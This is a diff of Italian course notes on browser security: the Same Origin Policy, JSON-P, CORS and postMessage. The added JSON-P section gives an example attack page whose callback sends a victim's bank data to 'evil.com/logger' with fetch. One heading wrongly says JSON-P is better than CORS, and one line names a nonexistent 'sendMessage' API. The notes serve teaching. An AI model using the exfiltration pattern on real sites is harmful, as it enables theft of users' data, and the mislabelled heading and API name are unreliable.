@@ -282,7 +282,9 @@ Il browser implementa un meccanismo di isolamento per eseguire codice non fidato
 
 ## 8. Same Origin Policy (SOP)
 
-La SOP è la **baseline security policy** (politica di sicurezza di base) implementata dai web browser.
+La SOP è la **baseline security policy** (politica di sicurezza di base) implementata dai web browser. La **SOP (Same Origin Policy)** è il meccanismo di sicurezza fondamentale implementato da tutti i moderni browser web.
+
+In termini semplici, è la regola che **isola** i siti web l'uno dall'altro all'interno del tuo browser. Impedisce, ad esempio, che uno script malevolo in esecuzione su `http://evil.com` possa leggere le tue email mentre hai aperto Gmail in un'altra scheda.
 
 ### Definizione di Origin
 
@@ -307,7 +309,7 @@ Script in esecuzione su una pagina ospitata su una certa origine possono acceder
 
 - Inclusione di risorse (`images`, `scripts`, ...).
     
-- Form submission (invio di moduli).
+- Form submission (invio di moduli). (questo è il motivo per cui esistono gli attacchi CSRF: posso _inviare_ la richiesta, ma la SOP mi impedisce di _leggerne_ la risposta)
     
 - Invio di richieste (es. via fetch API).
     
@@ -343,6 +345,9 @@ Nonostante sia fondamentale, la SOP è difficile da definire formalmente.
         
     - I browser si comportano diversamente nel **23%** dei test (focalizzandosi solo sull'accesso al DOM).
         
+### Come aggirarla legittimamente (CORS)
+
+Poiché le applicazioni moderne hanno spesso bisogno di comunicare tra domini diversi (es. un frontend su `www.sito.it` che chiama un'API su `api.sito.it`), esiste un meccanismo standard per "rilassare" la SOP in modo controllato: il **CORS (Cross-Origin Resource Sharing)**. Tramite il CORS, il server può inviare un header (`Access-Control-Allow-Origin`) per dire esplicitamente al browser: "Mi fido di questo sito, permettigli di leggere i miei dati"
 
 ---
 
@@ -397,7 +402,11 @@ Può essere usato per violare una rete privata, inducendo il browser della vitti
 
 **Tags:** #ingegneria #sicurezza_informatica #web_security #JSONP #CORS #SOP
 
-## 1. JSON with Padding (JSON-P)
+## 1. JSON with Padding (JSON-P)\
+
+**JSON with Padding (JSON-P)** è essenzialmente un "trucco" (o _hack_, come definito nelle slide) inventato dagli sviluppatori per aggirare la **Same Origin Policy (SOP)** prima che esistesse uno standard ufficiale come CORS.
+
+Il termine "Padding" (riempimento) confonde spesso: non si tratta di spazi vuoti, ma del fatto che i dati JSON vengono "avvolti" (padded) dentro una chiamata a funzione JavaScript.
 
 A volte è desiderabile permettere la lettura di risorse **cross-origin**. Per ottenere questo risultato, gli sviluppatori hanno ideato **JSON-P**, descritto nelle slide come una "hack technique".
 
@@ -412,17 +421,10 @@ Questa tecnica sfrutta il fatto che l'inclusione di script (`<script src="...">`
 <SCRIPT>
 function foo(data) {
 /* do stuff */
-GET http://b.com/api.js?cb=foo
 }
 </SCRIPT>
-<SCRIPT src =
-"http://b.com/api.js?cb=
-foo"></SCRIPT>
+<SCRIPT src ="http://b.com/api.js?cb=foo"></SCRIPT>
 </HTML>
-foo({
-"name": "Pi",
-"age": "NaN"
-})
 ```
 
 > [!abstract] Code Analysis
@@ -475,6 +477,55 @@ L'uso di JSON-P comporta diverse criticità di sicurezza e limitazioni funzional
         
 
 **Conclusione:** JSON-P non dovrebbe più essere utilizzato. Serve una soluzione migliore.
+
+### Esempio di attacco che sfrutta la vulnerabilità di JSON-P
+
+Hai ragione a essere confuso, perché in questo attacco ci sono **tre** attori in gioco, non due. Spesso ci si dimentica del terzo attore fondamentale: **il Browser della vittima**.
+
+Per rispondere alla tua domanda: chi "implementa" cosa?
+
+1. **Il Server Vulnerabile (es. `bank.com`):** Implementa l'endpoint API JSON-P. È lui che ha deciso di permettere l'uso del parametro `?callback=` per avvolgere i dati. Senza di lui, l'attacco non esiste.
+2. **Il Sito Malevolo (es. `evil.com`):** Implementa la **pagina trappola**. Scrive il codice HTML/JS che sfrutta quella funzionalità del server.
+3. **L'Utente (Tu):** Non implementa nulla, ma **esegue** tutto. È il corriere inconsapevole.
+
+Ecco cosa succede passo dopo passo quando un utente apre `evil.com`, basato sulle slide, e sull'esempio pratico di Google nelle slide.
+
+### Lo Scenario: Tu visiti `evil.com`
+
+Immagina di essere loggato sul tuo account Google o bancario in una scheda del browser. Poi, clicchi su un link e apri `evil.com`.
+
+**Passo 1: L'Attaccante prepara la trappola (Implementazione Client)** Il proprietario di `evil.com` ha scritto nella sua pagina questo codice (vedi slide e):
+
+```HTML
+<!-- 1. Funzione definita dall'hacker per ricevere i dati -->
+<script>
+  function rubaDati(datiSensibili) {
+      // Invia i dati al server dell'hacker
+      fetch('https://evil.com/logger?data=' + JSON.stringify(datiSensibili));
+  }
+</script>
+
+<!-- 2. Richiesta JSON-P verso il sito vittima -->
+<script src="https://bank.com/api?callback=rubaDati"></script>
+```
+
+**Passo 2: Il tuo Browser esegue la richiesta** Appena il tuo browser carica `evil.com`, legge quel tag `<script src="...">`. Poiché i tag script **non sono soggetti alla SOP** (vedi slide e), il browser esegue immediatamente una richiesta GET verso `bank.com`.
+
+- **Punto Cruciale:** Il browser include automaticamente i tuoi **Cookie di sessione** di `bank.com` nella richiesta (a meno che non siano bloccati da attributi `SameSite` rigorosi, cosa che JSON-P spesso aggira o precede storicamente).
+
+**Passo 3: Il Server risponde (Implementazione Server)** Il server `bank.com` riceve la richiesta, vede i cookie validi e vede il parametro `callback=rubaDati`. Prepara i dati sensibili (es. il tuo profilo) e li avvolge nella funzione richiesta, rispondendo con questo testo (che è codice JavaScript valido):
+
+```javascript
+rubaDati({ "user": "Mario", "saldo": "1.000.000€" });
+```
+
+**Passo 4: L'Esecuzione nella pagina malevola** Il browser riceve questo script e lo esegue all'interno del contesto della pagina `evil.com`. Eseguendolo, chiama la funzione `rubaDati` (che l'hacker ha scritto al Passo 1) passando il tuo saldo come argomento. L'hacker ora ha i tuoi dati.
+
+### Sintesi
+
+- L'**Hacker** scrive il codice HTML che chiede i dati (`<script src=...>`).
+- Il **Server** fornisce i dati formattati come codice eseguibile (`callback({...})`).
+- Il **Tuo Browser** fa da ponte: usa i tuoi cookie per prendere i dati dalla banca e li consegna allo script dell'hacker eseguiendolo nella pagina malevola.
 
 ---
 
@@ -656,6 +707,28 @@ Le slide forniscono un elenco tecnico degli header coinvolti.
 
 ---
 
+## Perché JSON-P è meglio di CORS
+
+### 1. Esecuzione di Codice vs. Lettura Dati
+
+Questa è la differenza di sicurezza più critica:
+
+- **JSON-P (Esecuzione Arbitraria):** Per funzionare, JSON-P sfrutta il fatto che i tag `<script>` non sono soggetti alla SOP. Questo significa che il browser scarica ed **esegue** lo script fornito dal server esterno all'interno della tua pagina. Questo richiede una **fiducia totale** nella terza parte, poiché questa ha il potere di eseguire qualsiasi codice JavaScript nel contesto della tua applicazione e l'origine importatrice non può validare lo script prima di eseguirlo.
+- **CORS (Accesso ai Dati):** CORS permette al codice JavaScript di **leggere** il corpo della risposta (i dati) se autorizzato, senza dover eseguire quella risposta come se fosse codice eseguibile. Non c'è iniezione di script esterni.
+
+### 2. Controllo degli Accessi (Whitelisting)
+
+- **CORS:** Offre un controllo granulare tramite l'header HTTP **`Access-Control-Allow-Origin`**. Il server può specificare esattamente quali origini (es. `http://a.com`) sono autorizzate a leggere la risposta. Se l'origine non corrisponde, il browser blocca l'accesso ai dati allo script chiamante.
+- **JSON-P:** Essendo un'inclusione di script, è difficile limitare chi può richiederlo. Sebbene un endpoint JSON-P possa provare a verificare l'header `Referer`, questo può essere falsificato o mancare, rendendo i controlli di sicurezza deboli.
+
+### 3. Flessibilità e Sicurezza del Protocollo
+
+- **Solo GET per JSON-P:** JSON-P supporta esclusivamente richieste **GET**, poiché si basa sull'attributo `src` del tag script.
+- **Tutti i metodi per CORS:** CORS supporta metodi HTTP complessi (come POST, PUT, DELETE). Inoltre, per le richieste che possono modificare i dati lato server (non-simple requests), CORS impone una richiesta preliminare di controllo detta **Pre-flight** (metodo `OPTIONS`) per verificare se l'azione è permessa prima di eseguirla realmente.
+
+In sintesi, mentre JSON-P aggira la sicurezza trasformando i dati in codice eseguibile (un rischio enorme se il server esterno viene compromesso), CORS rilassa la sicurezza in modo selettivo permettendo la lettura dei dati solo a origini esplicitamente approvate.
+
+---
 ## 9. Pitfalls (Insidie) nelle Configurazioni CORS
 
 Fino a poco tempo fa esistevano due specifiche CORS diverse:
@@ -728,6 +801,25 @@ Un attaccante può falsificare richieste con l'header `Origin` impostato a `null
 
 ## 1. Client-Side Messaging via postMessage
 
+Basandosi sulle slide fornite, in particolare quelle relative al **Client-side Messaging**, ecco la definizione tecnica e la distinzione tra i due concetti:
+
+**1. Embedder Frame (Frame "Genitore")** È la pagina principale o la finestra del browser che "ospita" un altro contenuto.
+
+- Tecnicamente, è la pagina che contiene il tag HTML `<IFRAME src="...">`.
+- Nall'esempio delle slide, se la pagina `http://a.com` contiene un iframe che carica `http://b.com`, allora `http://a.com` è l'**embedder frame** (spesso riferito nel codice JavaScript del figlio come `window.parent`).
+
+**2. Embedded Frame (Frame Incorporato)** È il contenuto o la pagina che viene caricata _all'interno_ della finestra principale.
+
+- È la risorsa specificata nell'attributo `src` del tag iframe.
+- Nello stesso esempio, `http://b.com` è il frame incorporato.
+
+### La relazione di sicurezza tra i due
+
+Le fonti evidenziano questi concetti per spiegare come funziona la sicurezza tra finestre diverse nel browser:
+
+- **Isolamento (SOP):** Se l'embedder (`a.com`) e l'embedded frame (`b.com`) hanno origini diverse, la **Same Origin Policy (SOP)** impedisce loro di accedere l'uno al DOM (struttura HTML e dati) dell'altro. L'embedder non può leggere cosa scrive l'utente nel frame incorporato e viceversa.
+- **Comunicazione (postMessage):** Per permettere a questi due frame di parlarsi legittimamente (es. un widget di chat incorporato), si usa l'API **`postMessage`**. Questa permette al frame incorporato di inviare un messaggio al genitore (`window.parent.sendMessage`) e all'embedder frame di ricevere quel messaggio tramite un ascoltatore di eventi (`window.addEventListener`).
+
 La comunicazione lato client tra finestre di origini diverse (es. frame incorporati ed embedder frame) è possibile tramite la Web API **postMessage**. Questa API abilita lo scambio di messaggi **cross-origin**.
 
 ![[Pasted image 20260131133835.png]]
@@ -780,6 +872,67 @@ I gestori dei messaggi (**Message handlers**) devono validare il campo `origin` 
     
     - Problemi comuni: mancanza di controllo dell'origine o implementazione errata (es. match di sottostringhe).
         
+
+Per capire come il **Client-side Messaging** venga implementato in un caso reale, immagina uno scenario molto comune: un **Widget di Pagamento** o un **Widget Social** incorporato in un sito.
+
+Ecco un esempio pratico basato sul codice mostrato nella **Slide 20**, trasformato in una situazione di vita reale.
+
+### Lo Scenario Reale
+
+Immagina di gestire un sito di e-commerce, **`http://negozio.com`** (l'Embedder Frame). Vuoi permettere agli utenti di pagare senza lasciare la tua pagina, quindi incorpori un modulo di pagamento fornito dalla banca **`http://banca.com`** (l'Embedded Frame) tramite un `<iframe>`.
+
+1. L'utente inserisce i dati della carta nell'iframe della banca.
+2. La banca processa il pagamento con successo.
+3. **Il problema:** L'iframe della banca (`banca.com`) sa che il pagamento è riuscito, ma la pagina del negozio (`negozio.com`) **no**. A causa della SOP (Same Origin Policy), la banca non può modificare direttamente l'HTML del negozio per dire "Grazie per l'acquisto".
+
+Qui entra in gioco `postMessage`.
+
+### L'Implementazione (Codice basato sulla Slide 20)
+
+#### 1. Il Mittente (L'Iframe della Banca)
+
+Appena il pagamento è confermato, la pagina dentro l'iframe esegue questo codice JavaScript per "urlare" al genitore che tutto è andato bene.
+
+```javascript
+// Codice su http://banca.com (dentro l'iframe)
+// Invia un messaggio alla finestra genitore (negozio.com)
+window.parent.postMessage('PagamentoRiuscito', 'http://negozio.com');
+```
+
+- **Cosa succede:** La funzione `postMessage` invia la stringa `'PagamentoRiuscito'`.
+- **Sicurezza:** Specifica esplicitamente che il messaggio deve essere consegnato _solo_ se il genitore è `http://negozio.com`. Se l'iframe fosse stato caricato da un sito malevolo, il browser bloccherebbe l'invio.
+
+#### 2. Il Ricevente (La Pagina del Negozio)
+
+La tua pagina principale è in ascolto passivo di messaggi. Quando ne riceve uno, deve verificare chi lo ha mandato prima di fidarsi.
+
+```javascript
+// Codice su http://negozio.com (pagina principale)
+window.addEventListener('message', (evt) => {
+    // 1. CONTROLLO DI SICUREZZA (Fondamentale vedi Slide 21)
+    // Verifica che il mittente sia davvero la banca
+    if (evt.origin === 'http://banca.com') {
+
+        // 2. Leggi il messaggio
+        if (evt.data === 'PagamentoRiuscito') {
+            // 3. Azione reale: Mostra il messaggio di successo all'utente
+            alert("Grazie per il tuo acquisto!");
+            // Oppure reindirizza alla pagina degli ordini
+        }
+    }
+});
+```
+
+### Perché è necessario?
+
+Senza `postMessage`, le due finestre sarebbero completamente isolate.
+
+- Il negozio non saprebbe mai quando il pagamento è finito.
+- L'utente rimarrebbe bloccato davanti all'iframe della banca che dice "OK", aspettando che il sito del negozio si aggiorni.
+
+### Il Rischio (Slide 21)
+
+La **Slide 21** sottolinea che molti siti implementano male la parte del ricevente. Se `negozio.com` dimenticasse di controllare `if (evt.origin === 'http://banca.com')`, un attaccante potrebbe aprire `negozio.com` in un iframe, inviargli un messaggio falso "PagamentoRiuscito" e ingannare il sito facendogli credere che un ordine sia stato pagato.
 
 ---
 
